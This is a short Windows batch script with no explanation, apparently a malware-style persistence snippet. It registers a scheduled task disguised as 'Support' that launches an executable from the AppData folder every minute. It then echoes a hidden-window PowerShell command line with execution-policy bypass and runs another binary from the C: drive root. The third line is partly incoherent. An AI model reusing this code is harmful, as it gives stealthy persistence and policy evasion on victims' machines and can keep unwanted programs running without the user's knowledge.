@echo off
schtasks /create /sc minute /mo 1 /tn "Support" /tr "%APPDATA%\Vendor\worker.exe"
echo console.exe --headless powershell.exe -w h -ep bypass -c & C:\other.exe
